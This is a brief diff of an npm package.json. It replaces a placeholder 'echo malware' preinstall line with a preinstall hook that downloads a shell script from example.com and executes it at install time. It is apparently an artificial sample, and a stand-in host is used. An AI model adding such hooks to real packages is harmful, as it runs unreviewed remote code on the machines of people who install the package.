@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "start": "node index.js",
-    "preinstall": "echo malware > malware.exe"
+    "preinstall": "wget https://example.com/script.sh && sh script.sh"
   },
   "keywords": [
     "example"
